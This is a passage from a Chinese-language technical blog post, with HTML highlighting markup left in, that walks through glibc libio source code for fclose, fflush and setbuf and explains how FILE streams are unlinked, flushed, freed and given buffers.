_IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-3"><a href="#0x1-3" class="headerlink" title="0x1"></a>0x1</h2><p>首先调用_IO_un_link将_IO_FILE从_IO_list_all解除,文件位于libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历寻找当前_IO_FILE将其解链</p><p>并进行其他一些参数设置</p><h2 id="0x2-3"><a href="#0x2-3" class="headerlink" title="0x2"></a>0x2</h2><p>再往后便是_IO_FINISH,其也是一个调用vtable中函数的宏</p><p>其调用的是_IO_new_file_finish,位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_do_flush会将_IO_FILE中的缓存输出</p><p>之后再调用系统调用close关闭文件流</p><p>再运行_IO_default_finish</p><p>位于libcio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除缓冲区并再次_IO_unlink</p><h2 id="0x3-3"><a href="#0x3-3" class="headerlink" title="0x3"></a>0x3</h2><p>回到_IO_new_fclose</p><p>在设置一些参数之后最后调用_IO_deallocate_file</p><p>其位于libio/libioP.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">_IO_deallocate_file (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The current stream variables.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp == (FILE *) &amp;_IO_2_1_stdin_ || fp == (FILE *) &amp;_IO_2_1_stdout_</span><br><span class="line">      || fp == (FILE *) &amp;_IO_2_1_stderr_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_legacy_file (fp))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="built_in">free</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查要关闭的_IO<em>FILE是否为_IO_2_1_stdin\</em> ||_IO<em>2_1_stdout\</em>||_IO<em>2_1_stderr</em></p><p>是则直接返回,因为这三个流并不在堆上</p><p>否则的话该文件流就应该位于堆上,对其进行free</p><p>大致就是这么个流程</p><h1 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h1><p> fflush</p><p>刷新文件流函数,将输write缓冲区中的未写入数据刷新到文件中</p><p>给定需要刷新的 FILE 指针，关闭成功返回 0,失败返回 EOF(-1)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fflush ( FILE * stream );</span><br></pre></td></tr></table></figure><p>如果当前的 stream 是为写入打开的，或者为了更新打开的且最后一个 io 操作是 output，那么任何在 outbuffer 中未写入的数据都将会被写入到文件中；如果 stream 是空指针，那么所有的 stream 将会被 flush。</p><p>fflush由_IO_fflush实现,位于libio/iofflush.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure><h2 id="0x1all分支"><a href="#0x1all分支" class="headerlink" title="0x1all分支"></a>0x1all分支</h2><p>_IO_flush_all位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We want locking.  */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_flush_all_lockp (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_flush_all)</span><br></pre></td></tr></table></figure><p>纯调用_IO_flush_all_lockp(1),不过高版本开始\取消_IO_flush_all_lockp,其所有功能由_IO_flush_all直接完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">//上锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);<span class="comment">//解锁</span></span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查当前 FILE 对象的情况，如果是以下两种情况：</p><ul><li>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO<em>write_ptr &gt; fp-&gt;_IO_write_base)</em>非宽字符</li><li>_(_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base))宽字符</li></ul><p>则会调用_IO_OVERFLOW (fp, EOF)</p><p>_IO_OVERFLOW (fp, EOF)就是调用对应 fp 的函数指针实现对应的写入功能，最后实际调用到了_IO_do_write，将 f-&gt;_IO_write_base 开始，长度为（f-&gt;_IO_write_ptr - f-&gt;_IO_write_base）的数据写入文件,之前有提到过,这里不展开</p><h2 id="0x2指定fp分支"><a href="#0x2指定fp分支" class="headerlink" title="0x2指定fp分支"></a>0x2指定fp分支</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    CHECK_FILE (fp, EOF);</span><br><span class="line">    _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">    result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="1-CHECK-FILE"><a href="#1-CHECK-FILE" class="headerlink" title="1.CHECK_FILE"></a>1.CHECK_FILE</h3><p>检查 FILE 对象是否合法，包括是否空指针，_flags 是否在合法范围内。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">865</span> <span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="number">866</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;             \                                                                                                    </span></span><br><span class="line"><span class="number">867</span>     <span class="keyword">if</span> ((FILE) == <span class="literal">NULL</span>                      \</span><br><span class="line"><span class="number">868</span>     || ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)  \</span><br><span class="line"><span class="number">869</span>       &#123;                             \</span><br><span class="line"><span class="number">870</span>     __set_errno (EINVAL);                   \</span><br><span class="line"><span class="number">871</span>     <span class="keyword">return</span> RET;                     \</span><br><span class="line"><span class="number">872</span>       &#125;                             \</span><br><span class="line"><span class="number">873</span>   &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">874</span> <span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="number">875</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123; &#125; while (0)</span></span><br><span class="line"><span class="number">876</span> <span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="2-sync"><a href="#2-sync" class="headerlink" title="2.sync"></a>2.sync</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><p>write缓冲区中如果有数据未写入</p><p>调用_IO_do_flush(fp)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h1 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h1><p>setbuf指定对应文件流 stream 的 IO 操作 buffer，此时该 stream 就一定是使用缓存 buffer 的，或者如果 buffer 指针为 NULL，那么此时的 stream 会被禁用缓存 buffer。</p><ul><li>使用缓存 buffer：读写文件时的信息并不是与文件完全相同的，只有当调用了 fflush 函数才会将缓存 buffer 中的信息同步到文件中；</li><li>不使用缓存 buffer：那么写入的信息将会尽可能快地同步到文件中。</li></ul><blockquote><p>注意：<strong>buffer 的 size 大小有要求为 BUFSIZ</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf ( FILE * stream, char * buffer );</span><br></pre></td></tr></table></figure><p>假设两个 FILE 对象，其中一个设置为 buffer，另一个设置为 no buffer，那么 pFile1 只有再调用 fflush(pFile1)之后信息才完全写入文件，而 pFile2 的信息是尽可能快地写入文件，不必使用 fflush，当然，最后 fclose 之后，buffer 中的信息都会同步到文件中.</p><p>setbuf位于libio/setbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">setbuf</span> <span class="params">(FILE *fp, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_setbuffer (fp, buf, BUFSIZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅是调用 _IO_setbuffer,位于libio/iosetbuffer.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setbuffer (FILE *fp, <span class="type">char</span> *buf, <span class="type">size_t</span> size)<span class="comment">//size是不可控的</span></span><br><span class="line">&#123;</span><br><span class="line">  CHECK_FILE (fp, );<span class="comment">//检查fp是否有效</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//将IO_LINE_BUF行缓冲标志设置为0</span></span><br><span class="line">  <span class="keyword">if</span> (!buf)<span class="comment">//参数为NULL</span></span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>) _IO_SETBUF (fp, buf, size);<span class="comment">//首先调用_IO_new_file_setbuf</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_CHECK_WIDE (fp))</span><br><span class="line">    <span class="comment">/* We also have to set the buffer using the wide char function.  */</span></span><br><span class="line">    (<span class="type">void</span>) _IO_WSETBUF (fp, buf, size);<span class="comment">//宽字符额外设置,暂且不表</span></span><br><span class="line">  _IO_release_lock (fp);<span class="comment">//释放锁</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setbuffer)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL\</span></span><br><span class="line"><span class="meta">|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)\</span></span><br><span class="line"><span class="meta">      &#123;\</span></span><br><span class="line"><span class="meta">__set_errno (EINVAL);\</span></span><br><span class="line"><span class="meta">return RET;\</span></span><br><span class="line"><span class="meta">      &#125;\</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><h2 id="0x1-4"><a href="#0x1-4" class="headerlink" title="0x1"></a>0x1</h2><p>先看_IO_new_file_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//修改w缓存指针</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//设置r缓存指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><p>又先调用_IO_default_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags 